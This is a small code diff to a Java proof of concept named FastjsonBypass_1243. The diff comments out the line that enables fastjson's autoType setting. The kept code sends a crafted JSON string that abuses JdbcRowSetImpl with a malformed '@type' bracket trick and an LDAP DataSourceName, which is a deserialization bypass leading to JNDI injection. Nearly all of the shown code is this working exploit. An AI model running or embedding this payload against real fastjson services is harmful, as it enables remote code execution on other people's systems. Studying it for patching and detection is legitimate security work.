@@ -13,7 +13,7 @@ import com.alibaba.fastjson.parser.ParserConfig;
 
 public class FastjsonBypass_1243 {
     public static void main(String[] args){
-        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
 
         String s="{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"DataSourceName\":\"ldap://127.0.0.1:8085/ZGBWoLkn\",\"AutoCommit\":1}";
         JSON.parseObject(s);
